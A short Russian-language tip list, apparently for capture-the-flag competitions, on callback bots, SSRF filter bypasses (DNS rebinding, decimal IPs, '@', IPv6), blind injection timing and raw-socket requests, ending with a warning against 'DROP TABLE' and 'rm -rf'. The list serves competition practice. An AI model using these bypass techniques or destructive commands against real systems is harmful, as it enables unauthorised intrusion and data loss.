- **Бот не приходит.** Ему нужен публичный URL; `localhost`/`127.0.0.1` не работают; подними ngrok/cloudflared, проверь порт и HTTPS.
- **SSRF «не работает».** Клиент не следует redirect, блокирует RFC1918, резолвит DNS один раз; пробуй rebinding, decimal IP, `@`, IPv6.
- **Слепые инъекции.** Ориентируйся на длину, статус, время, текст ошибки; сохраняй baseline и сравнивай.
- **Не доверяй `curl`.** Прокси, редиректы, нормализация path; для сырых байтов — python `socket`/Burp.
- **Не положи сервис.** Никаких `DROP TABLE`, `rm -rf`, бесконечных циклов и массовых запросов без ограничения; в AD это минус SLA.
